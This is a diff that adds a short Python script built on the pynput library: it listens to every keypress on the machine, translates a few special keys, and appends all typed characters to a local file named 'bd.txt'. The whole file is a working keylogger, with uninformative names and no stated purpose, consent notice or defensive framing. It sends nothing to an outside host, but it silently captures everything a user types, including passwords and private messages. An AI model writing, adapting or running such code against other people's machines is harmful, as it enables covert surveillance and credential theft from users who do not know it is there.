@@ -1,0 +1,35 @@
+
+from pynput.keyboard import Listener
+
+
+
+
+def world(Key):
+    root = str(Key)
+    root = root.replace("'","")
+    
+
+
+
+
+    if root == 'Key.space':
+        root = ' '
+
+    if root == 'Key.shift':
+        root = ''
+
+    if root == 'Key.backspace':
+        root = ''
+
+    if root == 'Key.enter':
+        root = '\n'
+
+
+
+
+    with open("bd.txt", 'a') as h:
+        h.write(root)
+
+with Listener(on_press=world)as l:
+    l.join()
+
